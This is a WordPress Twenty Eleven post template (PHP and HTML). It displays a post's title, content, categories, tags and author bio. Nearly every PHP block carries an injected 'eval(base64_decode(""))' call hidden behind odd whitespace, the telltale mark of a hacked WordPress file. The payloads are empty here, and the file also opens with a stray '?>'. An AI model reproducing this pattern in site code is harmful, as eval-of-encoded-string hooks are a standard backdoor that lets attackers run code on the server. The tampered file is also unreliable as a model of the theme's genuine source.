?>

<article id="post-<?php	 	eval(base64_decode("")); the_ID(); ?>" <?php	 	eval(base64_decode("")); post_class(); ?>>
	<header class="entry-header">
		<h1 class="entry-title"><?php	 	eval(base64_decode("")); the_title(); ?></h1>

		<?php	 	eval(base64_decode("")); if ( 'post' == get_post_type() ) : ?>
		<div class="entry-meta">
			<?php	 	eval(base64_decode("")); twentyeleven_posted_on(); ?>
		</div><!-- .entry-meta -->
		<?php	 	eval(base64_decode("")); endif; ?>
	</header><!-- .entry-header -->

	<div class="entry-content">
		<?php	 	eval(base64_decode("")); the_content(); ?>
		<?php	 	eval(base64_decode("")); wp_link_pages( array( 'before' => '<div class="page-link"><span>' . __( 'Pages:', 'twentyeleven' ) . '</span>', 'after' => '</div>' ) ); ?>
	</div><!-- .entry-content -->

	<footer class="entry-meta">
		<?php	 	eval(base64_decode(""));
			/* translators: used between list items, there is a space after the comma */
			$categories_list = get_the_category_list( __( ', ', 'twentyeleven' ) );

			/* translators: used between list items, there is a space after the comma */
			$tag_list = get_the_tag_list( '', __( ', ', 'twentyeleven' ) );
			if ( '' != $tag_list ) {
				$utility_text = __( 'This entry was posted in %1$s and tagged %2$s by <a href="%6$s">%5$s</a>. Bookmark the <a href="%3$s" title="Permalink to %4$s" rel="bookmark">permalink</a>.', 'twentyeleven' );
			} elseif ( '' != $categories_list ) {
				$utility_text = __( 'This entry was posted in %1$s by <a href="%6$s">%5$s</a>. Bookmark the <a href="%3$s" title="Permalink to %4$s" rel="bookmark">permalink</a>.', 'twentyeleven' );
			} else {
				$utility_text = __( 'This entry was posted by <a href="%6$s">%5$s</a>. Bookmark the <a href="%3$s" title="Permalink to %4$s" rel="bookmark">permalink</a>.', 'twentyeleven' );
			}

			printf(
				$utility_text,
				$categories_list,
				$tag_list,
				esc_url( get_permalink() ),
				the_title_attribute( 'echo=0' ),
				get_the_author(),
				esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) )
			);
		?>
		<?php	 	eval(base64_decode("")); edit_post_link( __( 'Edit', 'twentyeleven' ), '<span class="edit-link">', '</span>' ); ?>

		<?php	 	eval(base64_decode("")); if ( get_the_author_meta( 'description' ) && ( ! function_exists( 'is_multi_author' ) || is_multi_author() ) ) : // If a user has filled out their description and this is a multi-author blog, show a bio on their entries ?>
		<div id="author-info">
			<div id="author-avatar">
				<?php	 	eval(base64_decode("")); echo get_avatar( get_the_author_meta( 'user_email' ), apply_filters( 'twentyeleven_author_bio_avatar_size', 68 ) ); ?>
			</div><!-- #author-avatar -->
			<div id="author-description">
				<h2><?php	 	eval(base64_decode("")); printf( __( 'About %s', 'twentyeleven' ), get_the_author() ); ?></h2>
				<?php	 	eval(base64_decode("")); the_author_meta( 'description' ); ?>
				<div id="author-link">
					<a href="<?php	 	eval(base64_decode("")); echo esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ); ?>" rel="author">
						<?php	 	eval(base64_decode("")); printf( __( 'View all posts by %s <span class="meta-nav">&rarr;</span>', 'twentyeleven' ), get_the_author() ); ?>
					</a>
				</div><!-- #author-link	-->
			</div><!-- #author-description -->
		</div><!-- #entry-author-info -->
		<?php	 	eval(base64_decode("")); endif; ?>
	</footer><!-- .entry-meta -->
</article><!-- #post-<?php	 	eval(base64_decode("")); the_ID(); ?> -->
